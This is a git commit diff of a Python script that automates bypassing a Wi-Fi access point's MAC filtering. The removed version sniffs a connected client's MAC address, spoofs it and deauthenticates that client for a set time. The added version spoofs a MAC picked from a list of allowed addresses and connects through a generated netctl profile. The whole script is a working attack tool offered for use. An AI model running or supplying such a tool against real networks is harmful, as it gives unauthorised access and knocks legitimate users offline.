bde7da9c43d624afe97e80ed1a31ca0738e643a2
antsouchlos <an.tsouchlos@gmail.com>
2017-02-15 21:14:52 +0200

    moved 'bypass.py' to 'bypass.py_2.0' and added a new 'bypass.py', a simpler version

--- bypass.py
+++ bypass.py
@@ -1,196 +1,162 @@
 #!/usr/bin/python
 
-# function: automates the process of bypassing mac filtering of an access point
-
-#CURRENT PROBLEM: THE GETOUTPUT FUNCTION DOESN'T SEEM TO WORK CORRECTLY THE SECOND TIME, WHE THE BSSID OF THE CLIENT IS BEING DETERMINED (THE EXECUTE FUNCTION WORKS AS EXPECTED). NOTE: THE FUNCTION PUTS OUT MEANINGLESS TEXT, WICH GET BIGGER EACH TIME IT IS RUN
+#Automates the process of bypassing mac filtering of an access point
 
 from sys import argv, exit
+import random
+from os import getuid, path, remove
 import subprocess
 
-version = "[v1.0_pre-alpha]"
-tad = "12/2/2017 6:27"
+version="[v1.0]"
+tad="15/2/2017 16:34"
 
-def help():
-	print ("What it does:\nThis script automates the process of bypassing mac filtering of an access point. It does that by finding a host connected to that access point, masking the BSSID of an interface as the host's and kicking the host from the network for a given time interval.\n")
-
-	print("Usage: '" + argv[0] + " <ESSID> <interface> [seconds]'")
-	print("\tinterface: The interface to be used")
-	print("\tseconds: The number of seconds the host will be disconnected for. It must be a positive integer. If it is omitted, a default time of 180 seconds (3 minutes) will be used")
-	print("\tESSID: The ESSID of the network\n")
-	print("Example: '" + argv[0] + " WIND_WIFI wlan0 3'\n")
-
-	print("If the first argument is 'help', this help will be displayed")
-
-#find out if a string represents a positive integer
-def isPositiveInt(s):
-	try:
-		i = int(s)
-		if i < 0:
-			return False
-		return True
-	except ValueError:
-		return False
+configuration_file="bypass_config.txt"
+temporary_file="bypass_temp.txt"
+netctl_path="/etc/netctl/"
+profile="bypass_profile"
 
 def error(message):
-	print("Error: " + message)
+	print(argv[0] + ": Error: " + message)
 	exit()
 
-def getOutput(command):
-	child = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-	stdout, nothing = child.communicate()
+def checkRootPrivileges():
+	if getuid() == 0:
+		return True
 
-	return str(stdout)
+	return False
 
 def execute(command):
-	child = subprocess.Popen(command, stderr=subprocess.STDOUT, shell=True)
+	subprocess.call(command, stdout=subprocess.PIPE, shell=True)
 
-def askUser():
-	decision = input("Are you sure you want to continue?(y/n)")
+def readFile(filename):
+	lines = [line.rstrip('\n') for line in open(filename)]
 
-	if decision == 'y' or decision == 'Y':
-		return True
-	elif decision == 'n' or decision == "N":
-		return False
+	return lines
+
+def stop():
+	message = "Please run 'macchanger -p <interface>' to reset the BSSID of the interface and remove the files: '" + netctl_path + profile + "' and '" + temporary_file + "'"
+
+	if not path.isfile(temporary_file):
+		error("Temporary file '" + temporary_file + "' doesn't exist.\n" + message)
+
+	interface = readFile(temporary_file)
+
+	if len(interface) == 0:
+		error("Corrupted temporary file (" + temporary_file + ").\n" + message)
+
+	print("Disconnecting from network...")
+	execute("netctl stop " + profile)
+	print("Resetting BSSID of interface '" + interface[0] + "'...")
+	execute("macchanger -p " + interface[0])
+
+	print("Removing files: '" + netctl_path + profile + "', '" + temporary_file + "'")
+	remove(temporary_file)
+	if path.isfile(netctl_path + profile):
+		remove(netctl_path + profile)
 	else:
-		print("Invalid input. 'y' or 'n' expected")
-		return askUser()
-
-#TODO make sure first argument is an existing interface
-def verifyArguments():
-	if len(argv) > 1:
-		if argv[1] == "help":
-			help()
-			exit()
-
-	if len(argv) < 3:
-		error("Not enough arguments. Use the argument 'help' for more information")
-
-	if len(argv) > 3:
-		if not isPositiveInteger(argv[2]):
-			error("The third argument must be a positive integer")
-
-#find the channel and the BSSID of the access point
-#TODO error handling
-#TODO make it work with an ESSID with multiple words
-def findInfo(ESSID, interface):
-	output = getOutput("./airodump_wrapper " + interface)
-
-	for item in output.split("\n"):
-		if ESSID in item:
-			words = item.split()
-
-			return (words[words.index(ESSID) - 5], words[words.index(ESSID) - 10])
-
-		else:
-			error("No access point with the ESSID '" + ESSID+ "' could be detected")
-
-#get the BSSID of one of the clients
-#TODO error handling
-#TODO make it work with an ESSID with multiple words
-def getClientBSSID(channel, ap_BSSID, interface):
-	execute("./airodump_wrapper " + ap_BSSID + " " + channel + " " + interface)
-	output = getOutput("./airodump_wrapper " + ap_BSSID + " " + channel + " " + interface)
-
-	try:
-		lines = output.split("\n")
-
-		#-------- <DEBUG> --------
-		print("[DEBUG] len(lines): " + str(len(lines)))
-		print("[DEBUG] len(output): " + str(len(output)))
-		print("[DEBUG] command: ./airodump_wrapper " + ap_BSSID + " " + channel + " " + interface)
-
-		#if len(lines) < 100:
-		#	print("[DEBUG] <output>")
-		#	print(output)
-		#	print("[DEBUG] </output>")
-		#-------- </DEBUG> --------
-
-
-		for i in range(1, len(lines)):
-			if "RATE" in lines[i]:
-				#-------- <DEBUG> --------
-				print("[DEBUG] 'RATE' is in output")
-				#-------- </DEBUG> --------
-
-				words = (lines[i + 1]).split()
-
-				if words[1] == "associated)":
-					#-------- <DEBUG> --------
-					print("[DEBUG] client BSSID: " + words[2])
-					#-------- </DEBUG> --------
-
-					return words[2]
-				else:
-					#-------- <DEBUG> --------
-					print("[DEBUG] client BSSID: " + words[1])
-					#-------- </DEBUG> --------
-
-					return words[1]
-
-		error("An error occurred")
-
-	except IndexError:
-		error("No host connected to the access point could be detected")
-
-#TODO error handling
-#switch the interfaces BSSID to the BSSID of the detected client
-def maskAsClient(client_BSSID, interface):
-	#-------- <DEBUG> --------
-	print("[DEBUG] client_BSSID: " + client_BSSID)
-	print("[DEBUG] interface: " + interface)
-	#-------- </DEBUG> --------
-
-	execute("ifconfig " + interface + " down")
-	execute("macchanger -m " + client_BSSID + " " + interface)
-	execute("ifconfig " + interface + " up")
-
-#TODO error handling
-def kickClient(client_BSSID, ap_BSSID, timeout, interface):
-	execute("./aireplay_wrapper " + ap_BSSID + client_BSSID + interface + timeout)
-
-def main():
-	print(argv[0] + " " + version + "\n" + "Development started " + tad + "\n")
-
-	verifyArguments()
-
-	print("WARNINGS:")
-	print("\t-Make sure the interface is already in monitor mode when you run this script, as automatically detecting the state of the interface and changing it if necessary is not supported by the current version of the script")
-	print("\t-The current version of the script does not support ESSIDs with multiple words (spaces in the ESSID)")
-	print("\t-This script needs to be executed with root privileges\n")
-
-	if not askUser():
+		print("\nThe file '" + netctl_path + profile + "' does not exist. You will propably not be able to connect to any networks now. The only known solution to this bug is to restart your computer.")
 		exit()
 
-	time = 180
+def verifyArguments():
+	if len(argv) > 1:
+		if argv[1] == "stop":
+			stop()
+			exit()
+		elif argv[1] == "help":
+			print("\nDependencies:")
+			print("For this script to work, the 'netctl' and 'macchanger' packages need to be installed and the ifconfig command should be available (part of the net-tools package).\n")
 
-	if len(argv) > 3:
-		time = int(argv[3])
+			print("What it does:")
+			print("This script automates the process of bypassing mac filtering of an access point. It takes the ESSID and password of the network to connect to as an argument, as well as the interface to be used and a file in which BSSIDs that are known to be allowed to connect to the network are listed. The script changes the BSSID of the interface to one of the listed BSSIDs and connects to the network.")
+			print("Optionally, a configuration file (configuration_file) can be set up. If a configuration file exists, the script can be executed without arguments.\n")
 
-	ESSID = argv[1]
-	interface = argv[2]
+			print("Set up a configuration file:\nThe file's name  needs to be 'configuration_file', and it's contents should be structured as follows:\n")
 
-	#TODO make sure the card is running in monitor mode
+			print("\t<ESSID of the network to connect to>")
+			print("\t<Password of the network to connect to>")
+			print("\t<Interface to be used>")
+			print("\t<Name of the file, in which the known BSSIDs are listed>")
+			print("\n\t(Each item should be written on a new line)\n")
 
-	print("\nDetermining the BSSID and channel of the access point with the given ESSID...")
-	channel, ap_BSSID = findInfo(ESSID, interface)
-	print("Channel: " + channel)
-	print("BSSID of acccess point: " + ap_BSSID)
+			print("Usage: '" + argv[0] + " <ESSID> <Password> <Interface> <File>'")
+			print("Example: '" + argv[0] + " WIND_WIFI 12345 wlan0 BSSIDs.txt'")
 
-	print("\nFinding the BSSID of a client connected to the access point...")
-	client_BSSID = getClientBSSID(channel, ap_BSSID, interface)
-	print("BSSID of client: " + client_BSSID)
+			exit()
 
-	print("Changing the interface's BSSID to that of the found client...")
-	maskAsClient(client_BSSID, interface)
+	if not path.isfile(configuration_file):
+		if len(argv) < 5:
+			error("Not enough arguments. Use the argument 'help' for help")
 
-	print("Kicking Client...")
-	print("You should be able to connect to the network now. After " + time + " minutes the other host will be able to reconnect")
 
-	#TODO Reset BSSID afterwards
-	print("Make sure to change the BSSID of the interface back to the original afterwards")
-	#only use if the interface was initially in station mode
-	#print("Make sure to put the interface '" + interface + "' back in station mode afterwards")
+def changeBssid(interface, bssid):
+	execute("ifconfig " + interface + " down")
+	execute("macchanger -m " + bssid + " " + interface)
 
-	kickClient(client_BSSID, ap_BSSID, time, interface)
+def connect(interface, essid, password):
+	filename= netctl_path + profile
+
+	output = "Description='Automatically generated profile for " + argv[0] + "'\n"
+	output += "Interface=" + interface + "\n"
+	output += "Connection=wireless\nSecurity=wpa\n"
+	output += "ESSID='" + essid + "'\n"
+	output += "IP=dhcp\nKey=" + password + "\n"
+
+	file = open(filename, 'w')
+	file.write(output)
+	file.close()
+
+	execute("netctl start " + profile)
+
+def main():
+	print(argv[0] + " " + version + "\nDevelopment started " + tad + "\n")
+	verifyArguments()
+
+	if not checkRootPrivileges():
+		error("Error: This script requires root privileges")
+
+	if path.isfile(temporary_file):
+		error("Temporary file (" + temporary_file + ") detected. Please run '" + argv[0] + " stop' to stop the last session before continuing")
+
+	essid = None
+	password = None
+	interface = None
+	bssid_file = None
+
+	if path.isfile(configuration_file):
+		print("Reading configuration file...")
+		output = readFile(configuration_file)
+
+		if len(output) != 4:
+			error("Corrupted configuration file")
+		essid, password, interface, bssid_file = output
+	else:
+		essid = argv[1]
+		password = argv[2]
+		interface = argv[3]
+		bssid_file = argv[4]
+
+
+	temp_file = open(temporary_file, 'w')
+	temp_file.write(interface)
+	temp_file.close()
+
+	execute("chmod 666 " + temporary_file)
+
+	print("\nReading BSSIDs from file '" + bssid_file + "'...")
+	bssids = readFile(bssid_file)
+	if len(bssids) == 0:
+		error("No BSSIDs listed in file")
+	print("Read " + str(len(bssids)) + " BSSIDs")
+
+	print("\nChanging BSSID of interface '" + interface + "'...")
+	bssid = bssids[random.randint(0, len(bssids) - 1)]
+	changeBssid(interface, bssid)
+	print("Changed BSSID to '" + bssid + "'")
+
+	print("\nConnecting to network '" + essid + "'...")
+	connect(interface, essid, password)
+	print("Connected")
+
+	print("\nWhen you are done, run '" + argv[0] + " stop'. This will disconnect you from the network, reset the BSSID of the interface '" + interface + "' and delete files that were created during the initial execution of the script.")
 
 main()
